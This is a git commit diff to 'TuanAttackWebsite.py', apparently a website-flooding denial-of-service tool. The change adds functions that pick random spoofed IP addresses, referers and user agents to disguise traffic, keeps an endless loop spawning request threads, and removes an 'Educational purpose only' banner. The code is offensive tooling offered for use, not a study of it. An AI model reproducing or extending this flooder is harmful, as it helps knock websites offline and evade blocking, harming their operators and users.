dca647322451c5429246b2932be89904ae1f0eef
TuanCheatEngine <112158677+TuanCheatEngine@users.noreply.github.com>
2022-09-25 20:17:22 +0700

    Update TuanAttackWebsite.py

--- TuanAttackWebsite.py
+++ TuanAttackWebsite.py
@@ -1,11 +1,40 @@
+
+########################################
+#       TuanAttackWebsite       #
+########################################
+
 import os
 import requests
 import threading
 import random
+import sys
+import argparse
+from colorama import Fore
+import json
+import random
 
-########################################
-#       Educational purpose only       #
-########################################
+
+# Procura um IP aleatório
+def random_IP():
+    ip = []
+    for _ in range(0, 4):
+        ip.append(str(random.randint(1, 255)))
+    return ".".join(ip)
+
+
+# Procura uma referência aleatória
+def random_referer():
+    with open("IP/referers.txt", "r") as referers:
+        referers = referers.readlines()
+    return random.choice(referers)
+
+
+# Procura um user agent aleatório
+def random_useragent():
+    with open("IP/user_agents.json", "r") as agents:
+        user_agents = json.load(agents)["agents"]
+    return random.choice(user_agents)
+
 
 if os.name == 'nt':
     os.system("cls")
@@ -76,6 +105,7 @@ class httpth1(threading.Thread):
 
 while True:
     try:
+    
         th1 = httpth1()
         th1.start()
     except Exception:
